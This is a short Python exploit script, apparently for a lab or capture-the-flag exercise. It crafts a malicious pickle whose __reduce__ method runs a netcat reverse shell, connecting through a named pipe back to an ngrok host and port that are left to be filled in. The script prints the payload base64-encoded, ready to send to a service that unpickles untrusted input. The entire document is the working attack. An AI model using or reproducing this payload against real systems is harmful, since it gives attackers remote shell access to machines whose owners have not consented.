import base64
import os
import pickle

NGROK_HOST = ""  # TODO: ngrok host (check README.md)
NGROK_PORT = 0  # TODO: ngrok port (check README.md)


class RCE:
    def __reduce__(self):
        cmd = "rm -rf /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc %s %d > /tmp/f" % (
            NGROK_HOST,
            NGROK_PORT,
        )

        return os.system, (cmd,)


if __name__ == "__main__":
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode("utf-8"))
